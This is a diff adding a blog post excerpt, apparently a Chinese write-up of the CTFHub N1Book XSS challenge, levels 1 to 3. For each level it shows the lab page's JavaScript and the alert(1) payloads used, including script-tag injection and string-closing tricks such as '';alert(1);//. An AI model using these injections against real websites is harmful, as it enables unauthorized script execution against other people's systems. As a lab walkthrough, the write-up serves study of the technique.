@@ -152,6 +152,108 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-CTFHub_N1Book-XSS闯关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/04/27/CTFHub_N1Book-XSS%E9%97%AF%E5%85%B3/">XSS</a>
+    </h1>
+  
+
+        
+        <a href="/2022/04/27/CTFHub_N1Book-XSS%E9%97%AF%E5%85%B3/" class="archive-article-date">
+  	<time datetime="2022-04-27T02:57:08.578Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CTFHub-N1Book-XSS闯关"><a href="#CTFHub-N1Book-XSS闯关" class="headerlink" title="CTFHub_N1Book-XSS闯关"></a>CTFHub_N1Book-XSS闯关</h1><h5 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h5><p>查看前端源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;a-TplField&quot;</span>&gt;</span>welcome xss<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level1?username=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h5 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h5><p>查看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">    	&#125;</span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">var</span> username = <span class="string">&#x27;xss&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level2?username=alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>不行，查看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = <span class="string">&#x27;alert(1)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>闭合绕过一下，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level2?username=&#x27;;alert(1);//</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h5 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h5><p>查看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = <span class="string">&#x27;xss&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + username;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level3?username=alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>不行，上源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = <span class="string">&#x27;alert(1)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + username;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>闭合一下试一试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level3?username=&#x27;;alert(1);//</span><br></pre></td></tr></table></figure>
+
+<p>不行，继续看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = <span class="string">&#x27;\&#x27;;alert(1);//&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + username;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现单引号被转义，构造payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level3?username=&#x27;&#x27;;alert(1);//</span><br></pre></td></tr></table></figure>
+
+<p>成功进入下一关</p>
+<hr>
+<h5 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h5>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/04/27/CTFHub_N1Book-XSS%E9%97%AF%E5%85%B3/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-XSS漏洞入门" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
